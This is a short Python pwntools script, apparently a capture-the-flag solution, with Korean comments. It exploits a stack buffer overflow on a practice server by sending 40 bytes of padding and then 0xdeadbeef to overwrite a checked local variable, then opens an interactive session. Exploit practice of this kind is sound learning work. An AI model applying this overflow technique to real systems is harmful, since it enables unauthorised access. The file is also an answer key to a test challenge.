from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3000)

# 입력은 rbp-0x34
# 값 체크하는 부분은 rbp-0xc 이므로
# dummy를 덮고 체크하는 값을 0xdeadbeef로 덮어줌
dummy = b"A"*(0x34-0xc)
check = p32(0xdeadbeef)
payload = dummy + check
r.send(payload)

r.interactive()